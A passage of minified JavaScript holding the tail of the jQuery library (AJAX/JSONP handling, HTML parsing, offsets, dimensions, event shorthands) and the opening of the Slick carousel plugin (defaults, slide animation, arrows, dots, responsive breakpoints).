            (t = b("<script>")
              .prop({ charset: e.scriptCharset, src: e.url })
              .on(
                "load error",
                (n = function (e) {
                  t.remove(),
                    (n = null),
                    e && r("error" === e.type ? 404 : 200, e.type);
                })
              )),
              i.head.appendChild(t[0]);
          },
          abort: function () {
            n && n();
          },
        };
    });
  var Wt = [],
    Rt = /(=)\?(?=&|$)|\?\?/;
  b.ajaxSetup({
    jsonp: "callback",
    jsonpCallback: function () {
      var e = Wt.pop() || b.expando + "_" + mt++;
      return (this[e] = !0), e;
    },
  }),
    b.ajaxPrefilter("json jsonp", function (t, n, i) {
      var o,
        r,
        s,
        a =
          !1 !== t.jsonp &&
          (Rt.test(t.url)
            ? "url"
            : "string" == typeof t.data &&
            0 ===
            (t.contentType || "").indexOf(
              "application/x-www-form-urlencoded"
            ) &&
            Rt.test(t.data) &&
            "data");
      if (a || "jsonp" === t.dataTypes[0])
        return (
          (o = t.jsonpCallback =
            v(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback),
          a
            ? (t[a] = t[a].replace(Rt, "$1" + o))
            : !1 !== t.jsonp &&
            (t.url += (wt.test(t.url) ? "&" : "?") + t.jsonp + "=" + o),
          (t.converters["script json"] = function () {
            return s || b.error(o + " was not called"), s[0];
          }),
          (t.dataTypes[0] = "json"),
          (r = e[o]),
          (e[o] = function () {
            s = arguments;
          }),
          i.always(function () {
            void 0 === r ? b(e).removeProp(o) : (e[o] = r),
              t[o] && ((t.jsonpCallback = n.jsonpCallback), Wt.push(o)),
              s && v(r) && r(s[0]),
              (s = r = void 0);
          }),
          "script"
        );
    }),
    (h.createHTMLDocument = (function () {
      var e = i.implementation.createHTMLDocument("").body;
      return (
        (e.innerHTML = "<form></form><form></form>"), 2 === e.childNodes.length
      );
    })()),
    (b.parseHTML = function (e, t, n) {
      return "string" != typeof e
        ? []
        : ("boolean" == typeof t && ((n = t), (t = !1)),
          t ||
          (h.createHTMLDocument
            ? (((o = (t =
              i.implementation.createHTMLDocument("")).createElement(
                "base"
              )).href = i.location.href),
              t.head.appendChild(o))
            : (t = i)),
          (s = !n && []),
          (r = E.exec(e))
            ? [t.createElement(r[1])]
            : ((r = ge([e], t, s)),
              s && s.length && b(s).remove(),
              b.merge([], r.childNodes)));
      var o, r, s;
    }),
    (b.fn.load = function (e, t, n) {
      var i,
        o,
        r,
        s = this,
        a = e.indexOf(" ");
      return (
        a > -1 && ((i = ut(e.slice(a))), (e = e.slice(0, a))),
        v(t)
          ? ((n = t), (t = void 0))
          : t && "object" == typeof t && (o = "POST"),
        s.length > 0 &&
        b
          .ajax({ url: e, type: o || "GET", dataType: "html", data: t })
          .done(function (e) {
            (r = arguments),
              s.html(i ? b("<div>").append(b.parseHTML(e)).find(i) : e);
          })
          .always(
            n &&
            function (e, t) {
              s.each(function () {
                n.apply(this, r || [e.responseText, t, e]);
              });
            }
          ),
        this
      );
    }),
    b.each(
      [
        "ajaxStart",
        "ajaxStop",
        "ajaxComplete",
        "ajaxError",
        "ajaxSuccess",
        "ajaxSend",
      ],
      function (e, t) {
        b.fn[t] = function (e) {
          return this.on(t, e);
        };
      }
    ),
    (b.expr.pseudos.animated = function (e) {
      return b.grep(b.timers, function (t) {
        return e === t.elem;
      }).length;
    }),
    (b.offset = {
      setOffset: function (e, t, n) {
        var i,
          o,
          r,
          s,
          a,
          l,
          c = b.css(e, "position"),
          d = b(e),
          u = {};
        "static" === c && (e.style.position = "relative"),
          (a = d.offset()),
          (r = b.css(e, "top")),
          (l = b.css(e, "left")),
          ("absolute" === c || "fixed" === c) && (r + l).indexOf("auto") > -1
            ? ((s = (i = d.position()).top), (o = i.left))
            : ((s = parseFloat(r) || 0), (o = parseFloat(l) || 0)),
          v(t) && (t = t.call(e, n, b.extend({}, a))),
          null != t.top && (u.top = t.top - a.top + s),
          null != t.left && (u.left = t.left - a.left + o),
          "using" in t ? t.using.call(e, u) : d.css(u);
      },
    }),
    b.fn.extend({
      offset: function (e) {
        if (arguments.length)
          return void 0 === e
            ? this
            : this.each(function (t) {
              b.offset.setOffset(this, e, t);
            });
        var t,
          n,
          i = this[0];
        return i
          ? i.getClientRects().length
            ? ((t = i.getBoundingClientRect()),
              (n = i.ownerDocument.defaultView),
              { top: t.top + n.pageYOffset, left: t.left + n.pageXOffset })
            : { top: 0, left: 0 }
          : void 0;
      },
      position: function () {
        if (this[0]) {
          var e,
            t,
            n,
            i = this[0],
            o = { top: 0, left: 0 };
          if ("fixed" === b.css(i, "position")) t = i.getBoundingClientRect();
          else {
            for (
              t = this.offset(),
              n = i.ownerDocument,
              e = i.offsetParent || n.documentElement;
              e &&
              (e === n.body || e === n.documentElement) &&
              "static" === b.css(e, "position");

            )
              e = e.parentNode;
            e &&
              e !== i &&
              1 === e.nodeType &&
              (((o = b(e).offset()).top += b.css(e, "borderTopWidth", !0)),
                (o.left += b.css(e, "borderLeftWidth", !0)));
          }
          return {
            top: t.top - o.top - b.css(i, "marginTop", !0),
            left: t.left - o.left - b.css(i, "marginLeft", !0),
          };
        }
      },
      offsetParent: function () {
        return this.map(function () {
          for (
            var e = this.offsetParent;
            e && "static" === b.css(e, "position");

          )
            e = e.offsetParent;
          return e || ye;
        });
      },
    }),
    b.each(
      { scrollLeft: "pageXOffset", scrollTop: "pageYOffset" },
      function (e, t) {
        var n = "pageYOffset" === t;
        b.fn[e] = function (i) {
          return F(
            this,
            function (e, i, o) {
              var r;
              if (
                (g(e) ? (r = e) : 9 === e.nodeType && (r = e.defaultView),
                  void 0 === o)
              )
                return r ? r[t] : e[i];
              r
                ? r.scrollTo(n ? r.pageXOffset : o, n ? o : r.pageYOffset)
                : (e[i] = o);
            },
            e,
            i,
            arguments.length
          );
        };
      }
    ),
    b.each(["top", "left"], function (e, t) {
      b.cssHooks[t] = We(h.pixelPosition, function (e, n) {
        if (n)
          return (n = ze(e, t)), qe.test(n) ? b(e).position()[t] + "px" : n;
      });
    }),
    b.each({ Height: "height", Width: "width" }, function (e, t) {
      b.each(
        { padding: "inner" + e, content: t, "": "outer" + e },
        function (n, i) {
          b.fn[i] = function (o, r) {
            var s = arguments.length && (n || "boolean" != typeof o),
              a = n || (!0 === o || !0 === r ? "margin" : "border");
            return F(
              this,
              function (t, n, o) {
                var r;
                return g(t)
                  ? 0 === i.indexOf("outer")
                    ? t["inner" + e]
                    : t.document.documentElement["client" + e]
                  : 9 === t.nodeType
                    ? ((r = t.documentElement),
                      Math.max(
                        t.body["scroll" + e],
                        r["scroll" + e],
                        t.body["offset" + e],
                        r["offset" + e],
                        r["client" + e]
                      ))
                    : void 0 === o
                      ? b.css(t, n, a)
                      : b.style(t, n, o, a);
              },
              t,
              s ? o : void 0,
              s
            );
          };
        }
      );
    }),
    b.each(
      "blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(
        " "
      ),
      function (e, t) {
        b.fn[t] = function (e, n) {
          return arguments.length > 0
            ? this.on(t, null, e, n)
            : this.trigger(t);
        };
      }
    ),
    b.fn.extend({
      hover: function (e, t) {
        return this.mouseenter(e).mouseleave(t || e);
      },
    }),
    b.fn.extend({
      bind: function (e, t, n) {
        return this.on(e, null, t, n);
      },
      unbind: function (e, t) {
        return this.off(e, null, t);
      },
      delegate: function (e, t, n, i) {
        return this.on(t, e, n, i);
      },
      undelegate: function (e, t, n) {
        return 1 === arguments.length
          ? this.off(e, "**")
          : this.off(t, e || "**", n);
      },
    }),
    (b.proxy = function (e, t) {
      var n, i, o;
      if (("string" == typeof t && ((n = e[t]), (t = e), (e = n)), v(e)))
        return (
          (i = r.call(arguments, 2)),
          ((o = function () {
            return e.apply(t || this, i.concat(r.call(arguments)));
          }).guid = e.guid =
            e.guid || b.guid++),
          o
        );
    }),
    (b.holdReady = function (e) {
      e ? b.readyWait++ : b.ready(!0);
    }),
    (b.isArray = Array.isArray),
    (b.parseJSON = JSON.parse),
    (b.nodeName = A),
    (b.isFunction = v),
    (b.isWindow = g),
    (b.camelCase = _),
    (b.type = w),
    (b.now = Date.now),
    (b.isNumeric = function (e) {
      var t = b.type(e);
      return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e));
    }),
    "function" == typeof define &&
    define.amd &&
    define("jquery", [], function () {
      return b;
    });
  var Ft = e.jQuery,
    Bt = e.$;
  return (
    (b.noConflict = function (t) {
      return e.$ === b && (e.$ = Bt), t && e.jQuery === b && (e.jQuery = Ft), b;
    }),
    t || (e.jQuery = e.$ = b),
    b
  );
}),
  (function (e) {
    "use strict";
    "function" == typeof define && define.amd
      ? define(["jquery"], e)
      : "undefined" != typeof exports
        ? (module.exports = e(require("jquery")))
        : e(jQuery);
  })(function (e) {
    "use strict";
    var t = window.Slick || {};
    ((t = (function () {
      var t = 0;
      return function (n, i) {
        var o,
          r = this;
        (r.defaults = {
          accessibility: !0,
          adaptiveHeight: !1,
          appendArrows: e(n),
          appendDots: e(n),
          arrows: !0,
          asNavFor: null,
          prevArrow:
            '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
          nextArrow:
            '<button class="slick-next" aria-label="Next" type="button">Next</button>',
          autoplay: !1,
          autoplaySpeed: 3e3,
          centerMode: !1,
          centerPadding: "50px",
          cssEase: "ease",
          customPaging: function (t, n) {
            return e('<button type="button" />').text(n + 1);
          },
          dots: !1,
          dotsClass: "slick-dots",
          draggable: !0,
          easing: "linear",
          edgeFriction: 0.35,
          fade: !1,
          focusOnSelect: !1,
          focusOnChange: !1,
          infinite: !0,
          initialSlide: 0,
          lazyLoad: "ondemand",
          mobileFirst: !1,
          pauseOnHover: !0,
          pauseOnFocus: !0,
          pauseOnDotsHover: !1,
          respondTo: "window",
          responsive: null,
          rows: 1,
          rtl: !1,
          slide: "",
          slidesPerRow: 1,
          slidesToShow: 1,
          slidesToScroll: 1,
          speed: 500,
          swipe: !0,
          swipeToSlide: !1,
          touchMove: !0,
          touchThreshold: 5,
          useCSS: !0,
          useTransform: !0,
          variableWidth: !1,
          vertical: !1,
          verticalSwiping: !1,
          waitForAnimate: !0,
          zIndex: 1e3,
        }),
          (r.initials = {
            animating: !1,
            dragging: !1,
            autoPlayTimer: null,
            currentDirection: 0,
            currentLeft: null,
            currentSlide: 0,
            direction: 1,
            $dots: null,
            listWidth: null,
            listHeight: null,
            loadIndex: 0,
            $nextArrow: null,
            $prevArrow: null,
            scrolling: !1,
            slideCount: null,
            slideWidth: null,
            $slideTrack: null,
            $slides: null,
            sliding: !1,
            slideOffset: 0,
            swipeLeft: null,
            swiping: !1,
            $list: null,
            touchObject: {},
            transformsEnabled: !1,
            unslicked: !1,
          }),
          e.extend(r, r.initials),
          (r.activeBreakpoint = null),
          (r.animType = null),
          (r.animProp = null),
          (r.breakpoints = []),
          (r.breakpointSettings = []),
          (r.cssTransitions = !1),
          (r.focussed = !1),
          (r.interrupted = !1),
          (r.hidden = "hidden"),
          (r.paused = !0),
          (r.positionProp = null),
          (r.respondTo = null),
          (r.rowCount = 1),
          (r.shouldClick = !0),
          (r.$slider = e(n)),
          (r.$slidesCache = null),
          (r.transformType = null),
          (r.transitionType = null),
          (r.visibilityChange = "visibilitychange"),
          (r.windowWidth = 0),
          (r.windowTimer = null),
          (o = e(n).data("slick") || {}),
          (r.options = e.extend({}, r.defaults, i, o)),
          (r.currentSlide = r.options.initialSlide),
          (r.originalSettings = r.options),
          void 0 !== document.mozHidden
            ? ((r.hidden = "mozHidden"),
              (r.visibilityChange = "mozvisibilitychange"))
            : void 0 !== document.webkitHidden &&
            ((r.hidden = "webkitHidden"),
              (r.visibilityChange = "webkitvisibilitychange")),
          (r.autoPlay = e.proxy(r.autoPlay, r)),
          (r.autoPlayClear = e.proxy(r.autoPlayClear, r)),
          (r.autoPlayIterator = e.proxy(r.autoPlayIterator, r)),
          (r.changeSlide = e.proxy(r.changeSlide, r)),
          (r.clickHandler = e.proxy(r.clickHandler, r)),
          (r.selectHandler = e.proxy(r.selectHandler, r)),
          (r.setPosition = e.proxy(r.setPosition, r)),
          (r.swipeHandler = e.proxy(r.swipeHandler, r)),
          (r.dragHandler = e.proxy(r.dragHandler, r)),
          (r.keyHandler = e.proxy(r.keyHandler, r)),
          (r.instanceUid = t++),
          (r.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/),
          r.registerBreakpoints(),
          r.init(!0);
      };
    })()).prototype.activateADA = function () {
      this.$slideTrack
        .find(".slick-active")
        .attr({ "aria-hidden": "false" })
        .find("a, input, button, select")
        .attr({ tabindex: "0" });
    }),
      (t.prototype.addSlide = t.prototype.slickAdd =
        function (t, n, i) {
          var o = this;
          if ("boolean" == typeof n) (i = n), (n = null);
          else if (n < 0 || n >= o.slideCount) return !1;
          o.unload(),
            "number" == typeof n
              ? 0 === n && 0 === o.$slides.length
                ? e(t).appendTo(o.$slideTrack)
                : i
                  ? e(t).insertBefore(o.$slides.eq(n))
                  : e(t).insertAfter(o.$slides.eq(n))
              : !0 === i
                ? e(t).prependTo(o.$slideTrack)
                : e(t).appendTo(o.$slideTrack),
            (o.$slides = o.$slideTrack.children(this.options.slide)),
            o.$slideTrack.children(this.options.slide).detach(),
            o.$slideTrack.append(o.$slides),
            o.$slides.each(function (t, n) {
              e(n).attr("data-slick-index", t);
            }),
            (o.$slidesCache = o.$slides),
            o.reinit();
        }),
      (t.prototype.animateHeight = function () {
        var e = this;
        if (
          1 === e.options.slidesToShow &&
          !0 === e.options.adaptiveHeight &&
          !1 === e.options.vertical
        ) {
          var t = e.$slides.eq(e.currentSlide).outerHeight(!0);
          e.$list.animate({ height: t }, e.options.speed);
        }
      }),
      (t.prototype.animateSlide = function (t, n) {
        var i = {},
          o = this;
        o.animateHeight(),
          !0 === o.options.rtl && !1 === o.options.vertical && (t = -t),
          !1 === o.transformsEnabled
            ? !1 === o.options.vertical
              ? o.$slideTrack.animate(
                { left: t },
                o.options.speed,
                o.options.easing,
                n
              )
              : o.$slideTrack.animate(
                { top: t },
                o.options.speed,
                o.options.easing,
                n
              )
            : !1 === o.cssTransitions
              ? (!0 === o.options.rtl && (o.currentLeft = -o.currentLeft),
                e({ animStart: o.currentLeft }).animate(
                  { animStart: t },
                  {
                    duration: o.options.speed,
                    easing: o.options.easing,
                    step: function (e) {
                      (e = Math.ceil(e)),
                        !1 === o.options.vertical
                          ? ((i[o.animType] = "translate(" + e + "px, 0px)"),
                            o.$slideTrack.css(i))
                          : ((i[o.animType] = "translate(0px," + e + "px)"),
                            o.$slideTrack.css(i));
                    },
                    complete: function () {
                      n && n.call();
                    },
                  }
                ))
              : (o.applyTransition(),
                (t = Math.ceil(t)),
                !1 === o.options.vertical
                  ? (i[o.animType] = "translate3d(" + t + "px, 0px, 0px)")
                  : (i[o.animType] = "translate3d(0px," + t + "px, 0px)"),
                o.$slideTrack.css(i),
                n &&
                setTimeout(function () {
                  o.disableTransition(), n.call();
                }, o.options.speed));
      }),
      (t.prototype.getNavTarget = function () {
        var t = this.options.asNavFor;
        return t && null !== t && (t = e(t).not(this.$slider)), t;
      }),
      (t.prototype.asNavFor = function (t) {
        var n = this.getNavTarget();
        null !== n &&
          "object" == typeof n &&
          n.each(function () {
            var n = e(this).slick("getSlick");
            n.unslicked || n.slideHandler(t, !0);
          });
      }),
      (t.prototype.applyTransition = function (e) {
        var t = this,
          n = {};
        !1 === t.options.fade
          ? (n[t.transitionType] =
            t.transformType +
            " " +
            t.options.speed +
            "ms " +
            t.options.cssEase)
          : (n[t.transitionType] =
            "opacity " + t.options.speed + "ms " + t.options.cssEase),
          !1 === t.options.fade ? t.$slideTrack.css(n) : t.$slides.eq(e).css(n);
      }),
      (t.prototype.autoPlay = function () {
        var e = this;
        e.autoPlayClear(),
          e.slideCount > e.options.slidesToShow &&
          (e.autoPlayTimer = setInterval(
            e.autoPlayIterator,
            e.options.autoplaySpeed
          ));
      }),
      (t.prototype.autoPlayClear = function () {
        this.autoPlayTimer && clearInterval(this.autoPlayTimer);
      }),
      (t.prototype.autoPlayIterator = function () {
        var e = this,
          t = e.currentSlide + e.options.slidesToScroll;
        e.paused ||
          e.interrupted ||
          e.focussed ||
          (!1 === e.options.infinite &&
            (1 === e.direction && e.currentSlide + 1 === e.slideCount - 1
              ? (e.direction = 0)
              : 0 === e.direction &&
              ((t = e.currentSlide - e.options.slidesToScroll),
                e.currentSlide - 1 == 0 && (e.direction = 1))),
            e.slideHandler(t));
      }),
      (t.prototype.buildArrows = function () {
        var t = this;
        !0 === t.options.arrows &&
          ((t.$prevArrow = e(t.options.prevArrow).addClass("slick-arrow")),
            (t.$nextArrow = e(t.options.nextArrow).addClass("slick-arrow")),
            t.slideCount > t.options.slidesToShow
              ? (t.$prevArrow
                .removeClass("slick-hidden")
                .removeAttr("aria-hidden tabindex"),
                t.$nextArrow
                  .removeClass("slick-hidden")
                  .removeAttr("aria-hidden tabindex"),
                t.htmlExpr.test(t.options.prevArrow) &&
                t.$prevArrow.prependTo(t.options.appendArrows),
                t.htmlExpr.test(t.options.nextArrow) &&
                t.$nextArrow.appendTo(t.options.appendArrows),
                !0 !== t.options.infinite &&
                t.$prevArrow
                  .addClass("slick-disabled")
                  .attr("aria-disabled", "true"))
              : t.$prevArrow
                .add(t.$nextArrow)
                .addClass("slick-hidden")
                .attr({ "aria-disabled": "true", tabindex: "-1" }));
      }),
      (t.prototype.buildDots = function () {
        var t,
          n,
          i = this;
        if (!0 === i.options.dots) {
          for (
            i.$slider.addClass("slick-dotted"),
            n = e("<ul />").addClass(i.options.dotsClass),
            t = 0;
            t <= i.getDotCount();
            t += 1
          )
            n.append(
              e("<li />").append(i.options.customPaging.call(this, i, t))
            );
          (i.$dots = n.appendTo(i.options.appendDots)),
            i.$dots.find("li").first().addClass("slick-active");
        }
      }),
      (t.prototype.buildOut = function () {
        var t = this;
        (t.$slides = t.$slider
          .children(t.options.slide + ":not(.slick-cloned)")
          .addClass("slick-slide")),
          (t.slideCount = t.$slides.length),
          t.$slides.each(function (t, n) {
            e(n)
              .attr("data-slick-index", t)
              .data("originalStyling", e(n).attr("style") || "");
          }),
          t.$slider.addClass("slick-slider"),
          (t.$slideTrack =
            0 === t.slideCount
              ? e('<div class="slick-track"/>').appendTo(t.$slider)
              : t.$slides.wrapAll('<div class="slick-track"/>').parent()),
          (t.$list = t.$slideTrack.wrap('<div class="slick-list"/>').parent()),
          t.$slideTrack.css("opacity", 0),
          (!0 !== t.options.centerMode && !0 !== t.options.swipeToSlide) ||
          (t.options.slidesToScroll = 1),
          e("img[data-lazy]", t.$slider).not("[src]").addClass("slick-loading"),
          t.setupInfinite(),
          t.buildArrows(),
          t.buildDots(),
          t.updateDots(),
          t.setSlideClasses(
            "number" == typeof t.currentSlide ? t.currentSlide : 0
          ),
          !0 === t.options.draggable && t.$list.addClass("draggable");
      }),
      (t.prototype.buildRows = function () {
        var e,
          t,
          n,
          i,
          o,
          r,
          s,
          a = this;
        if (
          ((i = document.createDocumentFragment()),
            (r = a.$slider.children()),
            a.options.rows > 1)
        ) {
          for (
            s = a.options.slidesPerRow * a.options.rows,
            o = Math.ceil(r.length / s),
            e = 0;
            e < o;
            e++
          ) {
            var l = document.createElement("div");
            for (t = 0; t < a.options.rows; t++) {
              var c = document.createElement("div");
              for (n = 0; n < a.options.slidesPerRow; n++) {
                var d = e * s + (t * a.options.slidesPerRow + n);
                r.get(d) && c.appendChild(r.get(d));
              }
              l.appendChild(c);
            }
            i.appendChild(l);
          }
          a.$slider.empty().append(i),
            a.$slider
              .children()
              .children()
              .children()
              .css({
                width: 100 / a.options.slidesPerRow + "%",
                display: "inline-block",
              });
        }
      }),
      (t.prototype.checkResponsive = function (t, n) {
        var i,
          o,
          r,
          s = this,
          a = !1,
          l = s.$slider.width(),
          c = window.innerWidth || e(window).width();
        if (
          ("window" === s.respondTo
            ? (r = c)
            : "slider" === s.respondTo
              ? (r = l)
              : "min" === s.respondTo && (r = Math.min(c, l)),
            s.options.responsive &&
            s.options.responsive.length &&
            null !== s.options.responsive)
        ) {
          for (i in ((o = null), s.breakpoints))
            s.breakpoints.hasOwnProperty(i) &&
              (!1 === s.originalSettings.mobileFirst
                ? r < s.breakpoints[i] && (o = s.breakpoints[i])
                : r > s.breakpoints[i] && (o = s.breakpoints[i]));
          null !== o
            ? null !== s.activeBreakpoint
              ? (o !== s.activeBreakpoint || n) &&
              ((s.activeBreakpoint = o),
                "unslick" === s.breakpointSettings[o]
                  ? s.unslick(o)
                  : ((s.options = e.extend(
                    {},
                    s.originalSettings,
                    s.breakpointSettings[o]
                  )),
                    !0 === t && (s.currentSlide = s.options.initialSlide),
                    s.refresh(t)),
                (a = o))
              : ((s.activeBreakpoint = o),
                "unslick" === s.breakpointSettings[o]
                  ? s.unslick(o)
                  : ((s.options = e.extend(
                    {},
                    s.originalSettings,
                    s.breakpointSettings[o]
                  )),
                    !0 === t && (s.currentSlide = s.options.initialSlide),
                    s.refresh(t)),
                (a = o))
            : null !== s.activeBreakpoint &&
            ((s.activeBreakpoint = null),
              (s.options = s.originalSettings),
              !0 === t && (s.currentSlide = s.options.initialSlide),
              s.refresh(t),
              (a = o)),
            t || !1 === a || s.$slider.trigger("breakpoint", [s, a]);
        }
      }),
      (t.prototype.changeSlide = function (t, n) {
        var i,
          o,
          r = this,
          s = e(t.currentTarget);
        switch (
        (s.is("a") && t.preventDefault(),
          s.is("li") || (s = s.closest("li")),
          (i =
            r.slideCount % r.options.slidesToScroll != 0
              ? 0
              : (r.slideCount - r.currentSlide) % r.options.slidesToScroll),
          t.data.message)
        ) {
          case "previous":
            (o =
              0 === i ? r.options.slidesToScroll : r.options.slidesToShow - i),
              r.slideCount > r.options.slidesToShow &&
              r.slideHandler(r.currentSlide - o, !1, n);
            break;
          case "next":
            (o = 0 === i ? r.options.slidesToScroll : i),
              r.slideCount > r.options.slidesToShow &&
              r.slideHandler(r.currentSlide + o, !1, n);
            break;
          case "index":
            var a =
              0 === t.data.index
                ? 0
                : t.data.index || s.index() * r.options.slidesToScroll;
            r.slideHandler(r.checkNavigable(a), !1, n),
              s.children().trigger("focus");
            break;
          default:
            return;
        }
      }),
      (t.prototype.checkNavigable = function (e) {
        var t, n;
        if (((n = 0), e > (t = this.getNavigableIndexes())[t.length - 1]))
          e = t[t.length - 1];
        else
          for (var i in t) {
            if (e < t[i]) {
              e = n;
              break;
            }
            n = t[i];
          }
        return e;
      }),
      (t.prototype.cleanUpEvents = function () {
        var t = this;
        t.options.dots &&
          null !== t.$dots &&
          (e("li", t.$dots)
            .off("click.slick", t.changeSlide)
            .off("mouseenter.slick", e.proxy(t.interrupt, t, !0))
            .off("mouseleave.slick", e.proxy(t.interrupt, t, !1)),
            !0 === t.options.accessibility &&
            t.$dots.off("keydown.slick", t.keyHandler)),
          t.$slider.off("focus.slick blur.slick"),
          !0 === t.options.arrows &&
          t.slideCount > t.options.slidesToShow &&
          (t.$prevArrow && t.$prevArrow.off("click.slick", t.changeSlide),
            t.$nextArrow && t.$nextArrow.off("click.slick", t.changeSlide),
            !0 === t.options.accessibility &&
            (t.$prevArrow && t.$prevArrow.off("keydown.slick", t.keyHandler),
              t.$nextArrow && t.$nextArrow.off("keydown.slick", t.keyHandler))),
          t.$list.off("touchstart.slick mousedown.slick", t.swipeHandler),
          t.$list.off("touchmove.slick mousemove.slick", t.swipeHandler),
          t.$list.off("touchend.slick mouseup.slick", t.swipeHandler),
          t.$list.off("touchcancel.slick mouseleave.slick", t.swipeHandler),
          t.$list.off("click.slick", t.clickHandler),
          e(document).off(t.visibilityChange, t.visibility),
          t.cleanUpSlideEvents(),
          !0 === t.options.accessibility &&
          t.$list.off("keydown.slick", t.keyHandler),
          !0 === t.options.focusOnSelect &&
          e(t.$slideTrack).children().off("click.slick", t.selectHandler),
          e(window).off(
            "orientationchange.slick.slick-" + t.instanceUid,
            t.orientationChange
          ),
          e(window).off("resize.slick.slick-" + t.instanceUid, t.resize),
          e("[draggable!=true]", t.$slideTrack).off(
            "dragstart",
            t.preventDefault
          ),
          e(window).off("load.slick.slick-" + t.instanceUid, t.setPosition);
      }),
      (t.prototype.cleanUpSlideEvents = function () {
        var t = this;
        t.$list.off("mouseenter.slick", e.proxy(t.interrupt, t, !0)),
          t.$list.off("mouseleave.slick", e.proxy(t.interrupt, t, !1));
      }),
      (t.prototype.cleanUpRows = function () {
        var e,
          t = this;
        t.options.rows > 1 &&
          ((e = t.$slides.children().children()).removeAttr("style"),
            t.$slider.empty().append(e));
      }),
      (t.prototype.clickHandler = function (e) {
        !1 === this.shouldClick &&
          (e.stopImmediatePropagation(),
            e.stopPropagation(),
            e.preventDefault());
      }),
      (t.prototype.destroy = function (t) {
        var n = this;
        n.autoPlayClear(),
          (n.touchObject = {}),
          n.cleanUpEvents(),
          e(".slick-cloned", n.$slider).detach(),
          n.$dots && n.$dots.remove(),
          n.$prevArrow &&
          n.$prevArrow.length &&
          (n.$prevArrow
            .removeClass("slick-disabled slick-arrow slick-hidden")
            .removeAttr("aria-hidden aria-disabled tabindex")
            .css("display", ""),
            n.htmlExpr.test(n.options.prevArrow) && n.$prevArrow.remove()),
          n.$nextArrow &&
          n.$nextArrow.length &&
          (n.$nextArrow
            .removeClass("slick-disabled slick-arrow slick-hidden")
            .removeAttr("aria-hidden aria-disabled tabindex")
            .css("display", ""),
            n.htmlExpr.test(n.options.nextArrow) && n.$nextArrow.remove()),
          n.$slides &&
          (n.$slides
            .removeClass(
              "slick-slide slick-active slick-center slick-visible slick-current"
            )
            .removeAttr("aria-hidden")
            .removeAttr("data-slick-index")
            .each(function () {
              e(this).attr("style", e(this).data("originalStyling"));
            }),
            n.$slideTrack.children(this.options.slide).detach(),
            n.$slideTrack.detach(),
            n.$list.detach(),
            n.$slider.append(n.$slides)),
          n.cleanUpRows(),
          n.$slider.removeClass("slick-slider"),
          n.$slider.removeClass("slick-initialized"),
          n.$slider.removeClass("slick-dotted"),
          (n.unslicked = !0),
          t || n.$slider.trigger("destroy", [n]);
      }),
      (t.prototype.disableTransition = function (e) {
        var t = this,
          n = {};
        (n[t.transitionType] = ""),
          !1 === t.options.fade ? t.$slideTrack.css(n) : t.$slides.eq(e).css(n);
      }),
      (t.prototype.fadeSlide = function (e, t) {
        var n = this;
        !1 === n.cssTransitions
          ? (n.$slides.eq(e).css({ zIndex: n.options.zIndex }),
            n.$slides
              .eq(e)
              .animate({ opacity: 1 }, n.options.speed, n.options.easing, t))
          : (n.applyTransition(e),
            n.$slides.eq(e).css({ opacity: 1, zIndex: n.options.zIndex }),
            t &&
            setTimeout(function () {
              n.disableTransition(e), t.call();
            }, n.options.speed));
      }),
      (t.prototype.fadeSlideOut = function (e) {
        var t = this;
        !1 === t.cssTransitions
          ? t.$slides
            .eq(e)
            .animate(
              { opacity: 0, zIndex: t.options.zIndex - 2 },
              t.options.speed,
              t.options.easing
            )
          : (t.applyTransition(e),
            t.$slides.eq(e).css({ opacity: 0, zIndex: t.options.zIndex - 2 }));
      }),
      (t.prototype.filterSlides = t.prototype.slickFilter =
        function (e) {
          var t = this;
          null !== e &&
            ((t.$slidesCache = t.$slides),
              t.unload(),
              t.$slideTrack.children(this.options.slide).detach(),
              t.$slidesCache.filter(e).appendTo(t.$slideTrack),
              t.reinit());
        }),
      (t.prototype.focusHandler = function () {
        var t = this;
        t.$slider
          .off("focus.slick blur.slick")
          .on("focus.slick blur.slick", "*", function (n) {
            n.stopImmediatePropagation();
            var i = e(this);
            setTimeout(function () {
              t.options.pauseOnFocus &&
                ((t.focussed = i.is(":focus")), t.autoPlay());
            }, 0);
          });
      }),
      (t.prototype.getCurrent = t.prototype.slickCurrentSlide =
        function () {
          return this.currentSlide;
        }),
      (t.prototype.getDotCount = function () {
        var e = this,
          t = 0,
          n = 0,
          i = 0;
        if (!0 === e.options.infinite)
          if (e.slideCount <= e.options.slidesToShow) ++i;
          else
            for (; t < e.slideCount;)
              ++i,
                (t = n + e.options.slidesToScroll),
                (n +=
                  e.options.slidesToScroll <= e.options.slidesToShow
                    ? e.options.slidesToScroll
                    : e.options.slidesToShow);
        else if (!0 === e.options.centerMode) i = e.slideCount;
        else if (e.options.asNavFor)
          for (; t < e.slideCount;)
            ++i,
              (t = n + e.options.slidesToScroll),
              (n +=
                e.options.slidesToScroll <= e.options.slidesToShow
                  ? e.options.slidesToScroll
                  : e.options.slidesToShow);
        else
          i =
            1 +
            Math.ceil(
              (e.slideCount - e.options.slidesToShow) / e.options.slidesToScroll
            );
        return i - 1;
      }),
      (t.prototype.getLeft = function (e) {
        var t,
          n,
          i,
          o,
          r = this,
          s = 0;
        return (
          (r.slideOffset = 0),
          (n = r.$slides.first().outerHeight(!0)),
          !0 === r.options.infinite
            ? (r.slideCount > r.options.slidesToShow &&
              ((r.slideOffset = r.slideWidth * r.options.slidesToShow * -1),
                (o = -1),
                !0 === r.options.vertical &&
                !0 === r.options.centerMode &&
                (2 === r.options.slidesToShow
                  ? (o = -1.5)
                  : 1 === r.options.slidesToShow && (o = -2)),
                (s = n * r.options.slidesToShow * o)),
              r.slideCount % r.options.slidesToScroll != 0 &&
              e + r.options.slidesToScroll > r.slideCount &&
              r.slideCount > r.options.slidesToShow &&
              (e > r.slideCount
                ? ((r.slideOffset =
                  (r.options.slidesToShow - (e - r.slideCount)) *
                  r.slideWidth *
                  -1),
                  (s =
                    (r.options.slidesToShow - (e - r.slideCount)) * n * -1))
                : ((r.slideOffset =
                  (r.slideCount % r.options.slidesToScroll) *
                  r.slideWidth *
                  -1),
                  (s = (r.slideCount % r.options.slidesToScroll) * n * -1))))
            : e + r.options.slidesToShow > r.slideCount &&
            ((r.slideOffset =
              (e + r.options.slidesToShow - r.slideCount) * r.slideWidth),
              (s = (e + r.options.slidesToShow - r.slideCount) * n)),
